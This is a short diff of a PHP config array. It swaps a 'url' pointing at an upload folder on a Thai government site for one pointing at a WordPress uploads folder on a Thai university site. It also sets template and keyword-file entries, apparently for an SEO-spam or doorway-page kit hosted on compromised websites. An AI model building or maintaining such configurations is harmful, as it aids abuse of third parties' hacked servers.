@@ -1,6 +1,6 @@
 <?php
 $config = array(
-        'url'		=> 'https://www.lp-pao.go.th/Main60/administrator/upload/',
+        'url'		=> 'https://husoc.rmu.ac.th/wp-content/uploads/vovi/',
         'parameter' => 'go',
         'template'  => 'temp.html',
         'keywords'  => 'bb.txt',
